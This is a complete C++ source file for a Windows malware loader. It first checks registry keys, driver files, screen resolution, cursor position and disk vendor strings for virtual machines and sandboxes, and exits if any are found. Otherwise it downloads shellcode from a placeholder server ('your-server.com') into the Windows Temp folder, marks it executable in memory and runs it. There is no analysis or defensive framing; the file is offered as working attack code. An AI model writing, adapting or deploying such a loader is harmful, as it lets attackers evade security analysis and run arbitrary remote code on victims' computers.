#include <windows.h>
#include <iostream>
#include <vector>
#include <string>
#include <wininet.h>
#pragma comment(lib, "wininet.lib")

bool IsVirtualMachine() {
    const std::vector<std::pair<HKEY, std::wstring>> registryChecks = {
        {HKEY_LOCAL_MACHINE, L"HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0"},
        {HKEY_LOCAL_MACHINE, L"HARDWARE\\Description\\System"},
        {HKEY_LOCAL_MACHINE, L"SYSTEM\\ControlSet001\\Control\\SystemInformation"},
        {HKEY_LOCAL_MACHINE, L"HARDWARE\\ACPI\\DSDT\\VBOX__"},
        {HKEY_LOCAL_MACHINE, L"HARDWARE\\ACPI\\FADT\\VBOX__"},
        {HKEY_LOCAL_MACHINE, L"HARDWARE\\ACPI\\RSDT\\VBOX__"},
        {HKEY_LOCAL_MACHINE, L"SOFTWARE\\Oracle\\VirtualBox Guest Additions"},
        {HKEY_LOCAL_MACHINE, L"SYSTEM\\ControlSet001\\Services\\VBoxGuest"},
        {HKEY_LOCAL_MACHINE, L"SYSTEM\\ControlSet001\\Services\\VBoxMouse"},
        {HKEY_LOCAL_MACHINE, L"SYSTEM\\ControlSet001\\Services\\VBoxService"},
        {HKEY_LOCAL_MACHINE, L"SYSTEM\\ControlSet001\\Services\\VBoxSF"},
        {HKEY_LOCAL_MACHINE, L"SYSTEM\\ControlSet001\\Services\\VBoxVideo"},
        {HKEY_LOCAL_MACHINE, L"SOFTWARE\\VMware, Inc.\\VMware Tools"},
        {HKEY_LOCAL_MACHINE, L"SOFTWARE\\Wine"},
        {HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Virtual Machine\\Guest\\Parameters"},
        {HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum"},
        {HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Enum\\IDE"},
        {HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Enum\\SCSI"}
    };

    for (const auto& regCheck : registryChecks) {
        HKEY hKey;
        if (RegOpenKeyExW(regCheck.first, regCheck.second.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            RegCloseKey(hKey);
            return true;
        }
    }

    const std::vector<std::wstring> fileChecks = {
        L"system32\\drivers\\VBoxMouse.sys",
        L"system32\\drivers\\VBoxGuest.sys",
        L"system32\\drivers\\VBoxSF.sys",
        L"system32\\drivers\\VBoxVideo.sys",
        L"system32\\vboxdisp.dll",
        L"system32\\vboxhook.dll",
        L"system32\\vboxmrxnp.dll",
        L"system32\\vboxogl.dll",
        L"system32\\vboxoglarrayspu.dll",
        L"system32\\vboxoglcrutil.dll",
        L"system32\\vboxoglerrorspu.dll",
        L"system32\\vboxoglfeedbackspu.dll",
        L"system32\\vboxoglpackspu.dll",
        L"system32\\vboxoglpassthroughspu.dll",
        L"system32\\vboxservice.exe",
        L"system32\\vboxtray.exe",
        L"system32\\VBoxControl.exe",
        L"system32\\drivers\\vmmouse.sys",
        L"system32\\drivers\\vmhgfs.sys",
        L"system32\\drivers\\vm3dmp.sys",
        L"system32\\drivers\\vmci.sys",
        L"system32\\drivers\\vmhgfs.sys",
        L"system32\\drivers\\vmmemctl.sys",
        L"system32\\drivers\\vmmouse.sys",
        L"system32\\drivers\\vmrawdsk.sys",
        L"system32\\drivers\\vmusbmouse.sys"
    };

    for (const auto& fileCheck : fileChecks) {
        if (GetFileAttributesW(fileCheck.c_str()) != INVALID_FILE_ATTRIBUTES) {
            return true;
        }
    }

    return false;
}

bool IsSandboxByResolution() {
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);

    const int sandboxResolutions[][2] = {
        {1024, 768},
        {800, 600},
        {640, 480}
    };

    for (const auto& resolution : sandboxResolutions) {
        if (screenWidth == resolution[0] && screenHeight == resolution[1]) {
            return true;
        }
    }

    return false;
}

bool IsSandboxByMouseMovement() {
    POINT pt;
    GetCursorPos(&pt);
    if (pt.x == 0 && pt.y == 0) {
        return true;
    }
    return false;
}

bool IsVirtualDisk() {
    HANDLE hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (hDevice == INVALID_HANDLE_VALUE) {
        std::cerr << "Failed to open device." << std::endl;
        return false;
    }

    STORAGE_PROPERTY_QUERY storagePropertyQuery;
    DWORD bytesReturned;
    char buffer[10000];

    memset(&storagePropertyQuery, 0, sizeof(STORAGE_PROPERTY_QUERY));
    storagePropertyQuery.PropertyId = StorageDeviceProperty;
    storagePropertyQuery.QueryType = PropertyStandardQuery;

    if (DeviceIoControl(hDevice, IOCTL_STORAGE_QUERY_PROPERTY, &storagePropertyQuery, sizeof(STORAGE_PROPERTY_QUERY),
        &buffer, sizeof(buffer), &bytesReturned, NULL)) {
        STORAGE_DEVICE_DESCRIPTOR* deviceDescriptor = (STORAGE_DEVICE_DESCRIPTOR*)buffer;
        char vendorId[256] = { 0 };
        char productId[256] = { 0 };

        if (deviceDescriptor->VendorIdOffset != 0) {
            strcpy_s(vendorId, sizeof(vendorId), buffer + deviceDescriptor->VendorIdOffset);
        }
        if (deviceDescriptor->ProductIdOffset != 0) {
            strcpy_s(productId, sizeof(productId), buffer + deviceDescriptor->ProductIdOffset);
        }

        std::cout << "Vendor ID: " << vendorId << std::endl;
        std::cout << "Product ID: " << productId << std::endl;

        if (strstr(vendorId, "VMware") || strstr(vendorId, "VBOX") || strstr(productId, "Virtual")) {
            CloseHandle(hDevice);
            return true;
        }
    }
    else {
        std::cerr << "DeviceIoControl failed." << std::endl;
        CloseHandle(hDevice);
        return false;
    }

    CloseHandle(hDevice);
    return false;
}

bool DownloadFile(const char* url, const char* localPath) {
    HINTERNET hInternet = InternetOpenA("Downloader", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet == NULL) {
        std::cerr << "InternetOpenA failed." << std::endl;
        return false;
    }

    HINTERNET hUrl = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (hUrl == NULL) {
        std::cerr << "InternetOpenUrlA failed." << std::endl;
        InternetCloseHandle(hInternet);
        return false;
    }

    HANDLE hFile = CreateFileA(localPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        std::cerr << "CreateFileA failed." << std::endl;
        InternetCloseHandle(hUrl);
        InternetCloseHandle(hInternet);
        return false;
    }

    char buffer[4096];
    DWORD bytesRead;
    DWORD bytesWritten;
    BOOL bRead = InternetReadFile(hUrl, buffer, sizeof(buffer), &bytesRead);

    while (bRead && bytesRead > 0) {
        WriteFile(hFile, buffer, bytesRead, &bytesWritten, NULL);
        bRead = InternetReadFile(hUrl, buffer, sizeof(buffer), &bytesRead);
    }

    CloseHandle(hFile);
    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInternet);

    return true;
}

bool ExecuteShellcodeFromFile(const char* filePath) {
    HANDLE hFile = CreateFileA(filePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        std::cerr << "CreateFileA failed." << std::endl;
        return false;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE || fileSize == 0) {
        std::cerr << "Invalid file size." << std::endl;
        CloseHandle(hFile);
        return false;
    }

    unsigned char* shellcode = (unsigned char*)VirtualAlloc(NULL, fileSize, MEM_COMMIT, PAGE_READWRITE);
    if (shellcode == NULL) {
        std::cerr << "VirtualAlloc failed." << std::endl;
        CloseHandle(hFile);
        return false;
    }

    DWORD bytesRead;
    if (!ReadFile(hFile, shellcode, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
        std::cerr << "ReadFile failed." << std::endl;
        VirtualFree(shellcode, 0, MEM_RELEASE);
        CloseHandle(hFile);
        return false;
    }

    CloseHandle(hFile);

    DWORD oldProtect;
    if (!VirtualProtect(shellcode, fileSize, PAGE_EXECUTE_READ, &oldProtect)) {
        std::cerr << "VirtualProtect failed." << std::endl;
        VirtualFree(shellcode, 0, MEM_RELEASE);
        return false;
    }

    void(*func)();
    func = (void(*)())shellcode;
    func();

    VirtualFree(shellcode, 0, MEM_RELEASE);
    return true;
}

int main() {
    if (IsVirtualMachine()) {
        std::cout << "Running in a virtual machine environment.\n";
        return 1;
    }

    if (IsSandboxByResolution()) {
        std::cout << "Running in a sandbox environment (resolution check).\n";
        return 1;
    }

    if (IsSandboxByMouseMovement()) {
        std::cout << "Running in a sandbox environment (mouse movement check).\n";
        return 1;
    }

    if (IsVirtualDisk()) {
        std::cout << "Running in a virtual environment (HDD check).\n";
        return 1;
    }

    const char* url = "http://your-server.com/shellcode.bin";
    const char* localPath = "C:\\Windows\\Temp\\shellcode.bin";

    if (!DownloadFile(url, localPath)) {
        std::cerr << "Failed to download file." << std::endl;
        return 1;
    }

    if (!ExecuteShellcodeFromFile(localPath)) {
        std::cerr << "Failed to execute shellcode." << std::endl;
        return 1;
    }

    return 0;
}
